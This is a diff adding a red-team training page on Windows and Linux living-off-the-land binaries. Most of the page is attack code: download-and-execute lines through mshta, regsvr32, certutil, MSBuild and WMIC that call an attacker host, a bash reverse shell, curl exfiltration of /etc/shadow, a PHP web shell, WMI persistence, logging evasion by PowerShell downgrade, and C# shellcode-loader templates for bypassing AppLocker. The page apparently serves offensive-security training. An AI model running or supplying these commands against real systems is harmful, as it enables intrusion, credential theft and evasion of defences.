@@ -1,0 +1,361 @@
+---
+layout: training-page
+title: "LOLBins &amp; LOLBAS — Red Team Academy"
+module: "Evasion"
+tags:
+  - lolbins
+  - lolbas
+  - living-off-the-land
+  - signed-binaries
+page_key: "evasion-lolbins"
+---
+<h1>LOLBins &amp; LOLBAS</h1>
+
+  <h2>Overview</h2>
+  <p>Living Off the Land Binaries (LOLBins on Linux/macOS, LOLBAS on Windows) are legitimate, system-provided executables that can be abused for attacker objectives — execution, download, persistence, bypass, reconnaissance, and more. Because these binaries are signed by Microsoft (or the OS vendor), they bypass application whitelisting and often raise fewer AV/EDR alerts than dropped custom tools.</p>
+  <p>Reference: <strong>LOLBAS Project</strong> (lolbas-project.github.io) — comprehensive catalog of Windows binaries with attack use cases.</p>
+
+  <div class="diagram-container">
+    <img src="/images/evasion/lolbins-map.svg" alt="LOLBins map: certutil, mshta, regsvr32, rundll32, msiexec, wmic branching from Windows built-ins for download, execution, and persistence">
+    <div class="diagram-label">// living off the land — common lolbins and their abuse cases</div>
+  </div>
+
+  <h2>Execution via LOLBins</h2>
+  <p>Run code through trusted binaries to bypass application whitelisting and reduce signature detections.</p>
+  <pre><code>># mshta.exe — executes HTA applications (HTML + script):
+mshta.exe http://10.10.14.5/shell.hta
+mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""powershell -ep bypass -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"",0,True)(window.close)")
+
+# regsvr32.exe — COM scriptlet execution (squiblydoo):
+regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
+# /s: silent, /n: no DllRegisterServer, /u: unregister, /i: URL of SCT file
+
+# rundll32.exe — execute DLL export or JavaScript:
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc.exe",0,true)
+rundll32.exe shell32.dll,Control_RunDLL payload.dll
+rundll32.exe advpack.dll,LaunchINFSectionEx payload.inf,,1
+
+# wmic.exe — execute via XSL transform:
+wmic os get /FORMAT:"http://10.10.14.5/shell.xsl"
+# .xsl file contains JScript/VBScript code
+
+# certutil.exe — execute base64 encoded payload:
+certutil.exe -decode payload.b64 payload.exe
+certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe payload.exe
+
+# msiexec.exe — run MSI packages:
+msiexec.exe /q /i http://10.10.14.5/shell.msi
+
+# forfiles.exe — execute files with specific extensions:
+forfiles /p c:\windows\system32 /m notepad.exe /c "powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"</code></pre>
+
+  <h2>Download via LOLBins</h2>
+  <p>Download files from the internet using trusted binaries when PowerShell or curl are blocked.</p>
+  <pre><code>># certutil.exe — download file:
+certutil.exe -urlcache -split -f http://10.10.14.5/nc64.exe nc64.exe
+
+# bitsadmin.exe — Background Intelligent Transfer Service:
+bitsadmin.exe /transfer job /download /priority high http://10.10.14.5/shell.exe C:\Windows\Temp\shell.exe
+
+# PowerShell (when allowed):
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/shell.exe', 'C:\Windows\Temp\shell.exe')
+Invoke-WebRequest -Uri http://10.10.14.5/shell.exe -OutFile C:\Windows\Temp\shell.exe
+
+# curl.exe (Windows 10 1803+):
+curl.exe -o C:\Windows\Temp\shell.exe http://10.10.14.5/shell.exe
+
+# wget.exe (Windows 10+):
+wget.exe http://10.10.14.5/shell.exe -OutFile C:\Windows\Temp\shell.exe
+
+# regsvr32 download + execute in one:
+regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
+
+# mshta download + execute:
+mshta.exe http://10.10.14.5/shell.hta
+
+# expand.exe (cabinet tool — download):
+expand.exe http://10.10.14.5/shell.exe C:\Windows\Temp\shell.exe
+
+# desktopimgdownldr.exe (downloads wallpapers):
+set SYSTEMROOT=C:\Windows\Temp & desktopimgdownldr.exe /lockscreenurl:http://10.10.14.5/shell.exe /eventName:desktopimgdownldr</code></pre>
+
+  <h2>Persistence via LOLBins</h2>
+  <pre><code>># regsvr32 + scheduled task:
+schtasks /create /tn "Updater" /tr "regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll" /sc daily /st 09:00
+
+# COM hijacking persistence (see registry run keys in post-exploitation module)
+# Modify HKCU\SOFTWARE\Classes\CLSID\&#123;GUID&#125;\InprocServer32 → point to malicious DLL
+# regsvr32 won't be involved — DLL is loaded by legit app using that CLSID
+
+# msiexec for persistence via WMI:
+msiexec /q /i http://10.10.14.5/persist.msi
+
+# WMIC persistence:
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="filter1", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+# Installutil.exe — bypass AppLocker, run .NET assembly:
+installutil.exe /logfile= /logtoconsole=false /U payload.exe</code></pre>
+
+  <h2>Reconnaissance via LOLBins</h2>
+  <pre><code>># nltest.exe — domain recon:
+nltest /domain_trusts               # list domain trusts
+nltest /dclist:corp.local           # list DCs for domain
+nltest /sc_query:corp.local         # query secure channel status
+
+# net.exe — enumerate users, groups, shares:
+net user /domain
+net group "Domain Admins" /domain
+net share
+net use
+
+# netstat.exe — network connections:
+netstat -ano
+netstat -anob   # show process name (requires admin)
+
+# arp.exe — ARP table (nearby hosts):
+arp -a
+
+# ipconfig.exe:
+ipconfig /all
+
+# systeminfo.exe — OS + patch level:
+systeminfo
+
+# qwinsta.exe — logged in sessions:
+qwinsta /server:172.16.5.19
+
+# tasklist.exe — running processes:
+tasklist /v
+tasklist /s 172.16.5.19 /u Administrator /p 'Password123!'
+
+# reg.exe — read registry:
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v NullSessionShares
+
+# wmic.exe:
+wmic computersystem get username       # current user
+wmic process list brief               # processes
+wmic logicaldisk get caption,freespace,size  # drives</code></pre>
+
+  <h2>MSBuild — Inline C# Code Execution</h2>
+  <p>MSBuild compiles and executes C# code embedded in an XML project file. The binary is Microsoft-signed and bypasses AppLocker. No external compiler needed — MSBuild does it all inline.</p>
+  <pre><code># Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
+# Execute an XML project file:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+
+# payload.xml — launches process via inline C#:
+&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="MSBuildTask"&gt;&lt;ClassExample /&gt;&lt;/Target&gt;
+  &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"&gt;
+    &lt;Task&gt;&lt;Code Type="Class" Language="cs"&gt;&lt;![CDATA[
+      using System;
+      using Microsoft.Build.Framework;
+      using Microsoft.Build.Utilities;
+      public class ClassExample : Task &#123;
+        public override bool Execute() &#123;
+          System.Diagnostics.Process.Start("powershell.exe", "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')");
+          return true;
+        &#125;
+      &#125;
+    ]]&gt;&lt;/Code&gt;&lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;</code></pre>
+
+  <h2>InstallUtil / RegAsm / RegSvcs — .NET AppLocker Bypass</h2>
+  <p>These .NET framework utilities execute code from assemblies. The <code>/U</code> flag triggers the <code>Uninstall</code> method which runs arbitrary code without requiring install privileges.</p>
+  <pre><code># Compile a malicious .NET DLL (payload.cs with Installer class):
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library payload.cs
+
+# Execute via InstallUtil (triggers Uninstall method):
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
+
+# Execute via RegAsm:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U payload.dll
+
+# Execute via RegSvcs:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe payload.dll
+
+# WMIC process creation (local and remote):
+wmic process call create "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"
+wmic /node:192.168.1.10 /user:CORP\admin /password:Password123! process call create "cmd.exe /c whoami > C:\out.txt"
+
+# WMIC XSL execution (JScript in XSL file):
+wmic os get /FORMAT:"http://10.10.14.5/shell.xsl"</code></pre>
+
+  <h2>Linux LOLBins</h2>
+  <pre><code>># Download files:
+curl -o /tmp/shell http://10.10.14.5/shell
+wget -O /tmp/shell http://10.10.14.5/shell
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.5/shell', '/tmp/shell')"
+
+# Execute:
+bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+python3 -c 'import os;os.system("id")'
+
+# Privilege escalation via GTFOBins (sudo, SUID):
+# See privesc-linux.html for full GTFOBins reference
+
+# Data exfiltration:
+curl --data @/etc/shadow http://10.10.14.5/collect
+openssl enc -base64 < /etc/shadow | curl --data-binary @- http://10.10.14.5/collect
+
+# Write files (for web shells, cron, etc.):
+tee /var/www/html/shell.php &lt;&lt;'EOF'
+&lt;?php system($_GET['cmd']); ?&gt;
+EOF</code></pre>
+
+  <h2>PowerShell Downgrade Attack (Bypass Script Block Logging)</h2>
+  <p>PowerShell v2 predates Script Block Logging (introduced in v3). Downgrading to v2 prevents commands from being logged in Event Viewer. Check if v2 is still installed before attempting — it persists on many hosts.</p>
+  <pre><code># Check current version:
+Get-Host   # Version: 5.1.xxxxx
+
+# Downgrade to v2 (bypasses Script Block Logging):
+powershell.exe -version 2
+Get-Host   # Version: 2.0
+
+# From CMD:
+powershell.exe -version 2 -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/s.ps1')"
+
+# Detection: Event 400 PowerShell engine start — check EngineVersion field</code></pre>
+
+  <h2>Native AD Recon with Built-in Windows Commands</h2>
+  <p>When external tools cannot be loaded, native Windows commands provide full AD enumeration capability. Use net1 instead of net to avoid some signature-based detections on the "net" string.</p>
+  <pre><code># Host and domain info:
+hostname
+[System.Environment]::OSVersion.Version
+systeminfo                                # OS version, patches, domain, hotfixes
+echo %USERDOMAIN%                         # Domain name (CMD)
+echo %logonserver%                        # DC the host checks in with (CMD)
+
+# AD enumeration with net (or net1 for detection evasion):
+net user /domain                          # All domain users
+net group /domain                         # All domain groups
+net group "Domain Admins" /domain         # DA members
+net group "Domain Controllers" /domain    # DCs
+net group "domain computers" /domain      # All computers
+net accounts /domain                      # Password policy
+net localgroup administrators /domain     # Local admins (includes DA)
+net share                                 # Current shares
+net view /domain                          # PCs in domain
+
+# net1 — same functionality, different binary name:
+net1 user /domain
+net1 group "Domain Admins" /domain</code></pre>
+
+  <h2>Dsquery — Native LDAP Queries</h2>
+  <p>dsquery is available on any host with the AD DS role installed, and dsquery.dll exists on all modern Windows systems. It queries LDAP directly without external tools.</p>
+  <pre><code># Enumerate users and computers:
+dsquery user
+dsquery computer
+
+# Wildcard search — all objects in an OU:
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+# Find users with PASSWD_NOTREQD flag (blank password allowed):
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+# Find accounts with adminCount=1 (was in privileged group):
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(adminCount=1))" -attr distinguishedName
+
+# Combine dsquery + dsget for group membership:
+dsquery group -name "Domain Admins" | dsget group -members -expand</code></pre>
+
+  <h2>PowerShell History File</h2>
+  <p>PowerShell saves command history to a text file per user. This can contain credentials, scripts, and sensitive commands typed by admins.</p>
+  <pre><code># Read current user's PS history:
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+# Search for credentials in history:
+Select-String -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Pattern "password|cred|pass" -CaseSensitive:$false
+
+# Clear history (defensive):
+Remove-Item $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></pre>
+
+  <h2>InstallUtil — Detailed Code Execution via Installer Class</h2>
+  <p>InstallUtil executes code by calling the <code>Uninstall</code> method of a class that extends <code>System.Configuration.Install.Installer</code>. The binary lives in <code>%WINDIR%</code> so it passes default AppLocker rules. The <code>/U</code> flag triggers the uninstall path, running arbitrary code without install privileges. The <code>Main</code> method can be empty — the installer class handles execution.</p>
+  <pre><code># InstallUtil locations:
+# 32-bit: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+# 64-bit: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
+
+# Verify AppLocker allows InstallUtil (default rules permit it):
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
+
+# C# payload template — extend Installer, override Uninstall:
+# (Visual Studio: Console App .NET Framework, add reference to System.Configuration.Install.dll)
+# Reference DLL location:
+# C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll
+
+using System;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+
+public class NotMalware_IU &#123;
+    public static void Main(string[] args) &#123; &#125;  // empty Main — execution via Uninstall
+&#125;
+
+[System.ComponentModel.RunInstaller(true)]
+public class A : System.Configuration.Install.Installer &#123;
+    [DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+    [DllImport("kernel32")]
+    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    public override void Uninstall(System.Collections.IDictionary savedState) &#123;
+        // Shellcode decryption + injection logic here
+        // e.g., AES decrypt bufEnc → VirtualAlloc → copy → VirtualProtect → CreateThread
+    &#125;
+&#125;
+
+# Compile as x64 Release, then execute (triggers Uninstall method):
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\NotMalware_IU.exe
+
+# Flags: /logfile= suppresses log creation; /LogToConsole=false hides output; /U calls Uninstall</code></pre>
+
+  <h2>RunDll32 — DLL Execution via Exported Function</h2>
+  <p>RunDll32 loads a DLL and calls a named export. By creating a .NET DLL that exports a function via the <strong>DllExport</strong> NuGet package (which enables unmanaged exports from managed code), arbitrary code runs through a trusted Microsoft binary. Both RunDll32 locations pass default AppLocker policies.</p>
+  <pre><code># RunDll32 locations:
+# 32-bit: C:\Windows\SysWOW64\rundll32.exe
+# 64-bit: C:\Windows\System32\rundll32.exe
+
+# Verify AppLocker allows RunDll32:
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\System32\rundll32.exe
+
+# Project setup: Visual Studio, Class Library (.NET Framework) template
+# Add DllExport NuGet package (enables unmanaged exports from .NET):
+# NuGet source → search DllExport → Install → mark Installed checkbox → Apply → Reload All
+
+# C# DLL payload template with exported function:
+using System;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;
+using RGiesecke.DllExport;  // from DllExport NuGet package
+
+namespace RShell_D &#123;
+    internal class Program &#123;
+        [DllExport("DllMain")]  // exported function name callable by RunDll32
+        public static void DllMain() &#123;
+            // Reverse shell or shellcode execution logic here
+            // Note: hardcode IP/Port since no args passed to DLL exports
+            // For 32-bit target: use SysWOW64 PowerShell path
+            // C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
+        &#125;
+    &#125;
+&#125;
+
+# Compile: switch Debug→Release, set x86 or x64 depending on target architecture
+# For 64-bit: change Any CPU to x64 via Configuration Manager
+
+# Execute — RunDll32 loads the DLL and calls DllMain export:
+# 32-bit DLL:
+C:\Windows\SysWOW64\rundll32.exe C:\path\to\RShell_D.dll,DllMain
+
+# 64-bit DLL:
+C:\Windows\System32\RunDll32.exe C:\path\to\RShell_D.dll,DllMain
+
+# Bypasses AppLocker (binary in %WINDIR%) and real-time protection (custom payload)</code></pre>
